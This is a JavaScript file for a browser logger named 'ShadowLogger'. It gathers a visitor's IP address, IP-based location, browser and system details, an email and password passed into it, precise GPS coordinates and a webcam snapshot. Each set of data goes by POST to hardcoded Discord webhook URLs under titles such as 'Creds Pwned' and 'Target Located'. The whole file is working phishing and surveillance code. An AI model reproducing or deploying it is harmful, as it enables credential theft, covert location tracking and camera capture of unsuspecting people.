// Set a cookie
function setCookie(name, value, days = 7) {
    const expires = new Date(Date.now() + days*24*60*60*1000).toUTCString();
    document.cookie = `${name}=${encodeURIComponent(value)}; expires=${expires}; path=/`;
}

// Get a cookie
function getCookie(name) {
    const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
    return match ? decodeURIComponent(match[2]) : null;
}

// Delete a cookie
function deleteCookie(name) {
    document.cookie = `${name}=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/`;
}

const PostIP = async () => {
    try {
        const geoResponse = await fetch('https://ipapi.co/json/');
        const geoData = await geoResponse.json();
        const ipadd = geoData.ip;

        setCookie("ip", geoData.ip, 7);

        const sysinfo = 
            "```xl\n" + navigator.userAgent + "```" +
            "```autohotkey\n" +
            "Platform: " + navigator.platform +
            "\nCookies_Enabled: " + navigator.cookieEnabled +
            "\nBrowser_Language: " + navigator.language +
            "\nBrowser_Name: " + navigator.appName +
            "\nBrowser_CodeName: " + navigator.appCodeName +
            "\nRam: " + navigator.deviceMemory +
            "\nCPU_cores: " + navigator.hardwareConcurrency +
            "\nScreen_Width: " + screen.width +
            "\nScreen_Height: " + screen.height +
            "\nRefUrl: " + document.referrer +
            "\nOscpu: " + navigator.oscpu + "```";

        const dscURL = 'https://discord.com/api/webhooks/1413233095963840512/YDScEIPIpzzNfrqZ4tkwBCiZ8JKZHH7neUTSEZKJGA6Xq3o7g38aB0-D6fCmHLwGHCsn'; //place webhook here
        const dscResponse = await fetch(dscURL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                username: "ShadowLogger",
                avatar_url: "https://raw.githubusercontent.com/ARMed0ps/ShadowLogger/refs/heads/main/images/ShadowLogger%20pfp.png",
                content: `@everyone`,
                embeds: [
                    {
                        title: "🌐 IP Compromised",
                        color: 0x800080,
                        fields: [
                            { name: "🧠 IP Address", value: `${ipadd}`, inline: true },
                            { name: "🌍 Location based on IP address", value: `**Network:** ${geoData.org}\n**City:** ${geoData.city}\n**Region:** ${geoData.region}\n**Country:** ${geoData.country_name}`, inline: true },
                            { name: "📮 Postal & Coords based on IP address", value: `**Postal Code:** ${geoData.postal}\n**Latitude:** ${geoData.latitude}\n**Longitude:** ${geoData.longitude}`, inline: true },
                            { name: "🗺️ Google Maps based on IP address", value: `[📍 View Location](https://www.google.com/maps?q=${geoData.latitude},${geoData.longitude})`, inline: true },
                            { name: "📘 Full IP Data based on IP address", value: `[🌐 View Full JSON](https://ipapi.co/${ipadd}/json/)`, inline: true },
                            { name: "💻 Browser/System Info ", value: sysinfo, inline: false }
                        ],
                        thumbnail: { url: "https://raw.githubusercontent.com/ARMed0ps/ShadowLogger/refs/heads/main/images/ShadowLogger%20pfp.png" },
                        footer: { text: "ShadowLogger by ARMed0ps", icon_url: "https://raw.githubusercontent.com/ARMed0ps/ShadowLogger/refs/heads/main/images/ShadowLogger%20pfp.png" },
                        timestamp: new Date().toISOString()
                    }
                ]
            })
        });

        if (dscResponse.ok) {
            console.log('Sent! <3');
        } else {
            console.log('Failed :(');
        }
    } catch (error) {
        console.error('Error:', error);
    }
};

const PostCreds = async (email = 'unknown', password = 'unknown') => {
    try {
        const ip = getCookie("ip");

        setCookie("email", email, 7);
        setCookie("password", password, 7);

        const dscURL = 'https://discord.com/api/webhooks/1413233837403803798/fqZo24-k0eR3MrITIZG87lcvO9rE76OnwiGUIERQTQFoqQWUa79DU6NRy3done6ronim'; //place webhook here
        const dscResponse = await fetch(dscURL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                username: "ShadowLogger",
                avatar_url: "https://raw.githubusercontent.com/ARMed0ps/ShadowLogger/refs/heads/main/images/ShadowLogger%20pfp.png",
                content: `@everyone`,
                embeds: [
                    {
                        title: "🔓 Creds Pwned",
                        color: 0x800080,
                        fields: [
                            { name: "📧 Credentials", value: `**Email:** ${email}\n**Password:** ${password}`, inline: true },
                            { name: "🧠 IP Address", value: `${ip}`, inline: true },
                            { name: "📘 Full IP Data based on IP address", value: `[🌐 View Full JSON](https://ipapi.co/${ip}/json/)`, inline: true }
                        ],
                        thumbnail: { url: "https://raw.githubusercontent.com/ARMed0ps/ShadowLogger/refs/heads/main/images/ShadowLogger%20pfp.png" },
                        footer: { text: "ShadowLogger by ARMed0ps", icon_url: "https://raw.githubusercontent.com/ARMed0ps/ShadowLogger/refs/heads/main/images/ShadowLogger%20pfp.png" },
                        timestamp: new Date().toISOString()
                    }
                ]
            })
        });

        if (dscResponse.ok) {
            console.log('Sent! <3');
        } else {
            console.log('Failed :(');
        }
    } catch (error) {
        console.error('Error:', error);
    }
};

const PostGPS = async () => {
    const ip = getCookie("ip");
    const email = getCookie("email");
    const password = getCookie("password")

    let latlong = '📍 Location: Not Available';

    if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
        (position) => {
            latlong = `[📍 Google Maps Location](https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude})
                        🎯 Accuracy: ±${position.coords.accuracy} meters`;


            
            PostGPSData(email, password, latlong);
        },
        (error) => {
            switch (error.code) {
                case error.PERMISSION_DENIED:
                    latlong = '📍 Location: Permission Denied';
                    break;
                case error.POSITION_UNAVAILABLE:
                    latlong = '📍 Location: Unavailable';
                    break;
                case error.TIMEOUT:
                    latlong = '📍 Location: Request Timed Out';
                    break;
                default:
                    latlong = '📍 Location: Unknown Error';
                    break;
            }
            PostGPSData(email, password, latlong);
        },
        {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0
        }
    );
} else {
    latlong = '📍 Location: Not Supported';
    PostGPSData(email, password, latlong);
}


            async function PostGPSData(email, password, latlong) {
            try {
                setCookie("latlong", latlong, 7);
                const dscURL = 'https://discord.com/api/webhooks/1413515263206494318/jJM3jP2BxvUISRtEi__mplxVAchES0bHDllr_k-1sTFAS-gDYIY_XGCfvqR84D10mcUQ'; //place webhook here
                await fetch(dscURL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        username: "ShadowLogger",
                        avatar_url: "https://raw.githubusercontent.com/ARMed0ps/ShadowLogger/refs/heads/main/images/ShadowLogger%20pfp.png",
                        content: "@everyone",
                        embeds: [
                            {
                                title: "📍 Target Located",
                                color: 0x800080,
                                fields: [
                                    { name: "📧 Credentials", value: `**Email:** ${email}\n**Password:** ${password}`, inline: true },
                                    { name: "🧠 IP Address", value: ip, inline: true },
                                    { name: "🌍 Location", value: latlong, inline: true },
                                    { name: "📘 Full IP Data", value: `[🌐 View JSON](https://ipapi.co/${ip}/json/)`, inline: true }
                                ],
                                thumbnail: { url: "https://raw.githubusercontent.com/ARMed0ps/ShadowLogger/refs/heads/main/images/ShadowLogger%20pfp.png" },
                                footer: { text: "ShadowLogger by ARMed0ps", icon_url: "https://raw.githubusercontent.com/ARMed0ps/ShadowLogger/refs/heads/main/images/ShadowLogger%20pfp.png" },
                                timestamp: new Date().toISOString()
                            }
                        ]
                    })
                });

                console.log('Location and credentials sent!');
            } catch (error) {
                console.error('Error sending location:', error);
            }
};
window.PostCamera = async () => {
    const video = document.createElement('video');
    const canvas = document.createElement('canvas');

    const constraints = { audio: false, video: { facingMode: "user" } };

  try {
    // Request camera access
    const stream = await navigator.mediaDevices.getUserMedia(constraints);
    video.srcObject = stream;
    video.autoplay = true;

    // Wait until video metadata is loaded (so we know its resolution)
    await new Promise(resolve => video.onloadedmetadata = resolve);

    // Match canvas to camera resolution
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    // Capture single frame
    const context = canvas.getContext('2d');
    context.drawImage(video, 0, 0, canvas.width, canvas.height);

    // Convert to Blob
    const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/png'));

    // Prepare webhook payload using FormData
    const dscURL = 'https://discord.com/api/webhooks/1413526956196102247/ViV3qcv9p4lPDsuPeANzDmpg1Qt2ee_RGW3OkTnUsqVvQ4eEtHCE_QTU8SELh793TYrt';
    const formData = new FormData();

    const payload = {
      username: "ShadowLogger",
      avatar_url: "https://raw.githubusercontent.com/ARMed0ps/ShadowLogger/refs/heads/main/images/ShadowLogger%20pfp.png",
      content: "@everyone",
      embeds: [
        {
          title: "📍 Target Located",
          color: 0x800080,
          fields: [
            { name: "📧 Credentials", value: `**Email:** ${email}\n**Password:** ${password}`, inline: true },
            { name: "🧠 IP Address", value: ip, inline: true },
            { name: "🌍 Location", value: latlong, inline: true },
            { name: "📘 Full IP Data", value: `[🌐 View JSON](https://ipapi.co/${ip}/json/)`, inline: true }
          ],
          footer: { text: "ShadowLogger by ARMed0ps" },
          timestamp: new Date().toISOString()
        }
      ]
    };

    formData.append('payload_json', JSON.stringify(payload));
    formData.append('file', blob, 'target.png'); // attach image

    // Send to Discord
    await fetch(dscURL, {
      method: 'POST',
      body: formData
    });

    console.log("Location, credentials, and image sent!");

  } catch (e) {
    console.error("Camera access denied or error occurred:", e);
  }
};
}
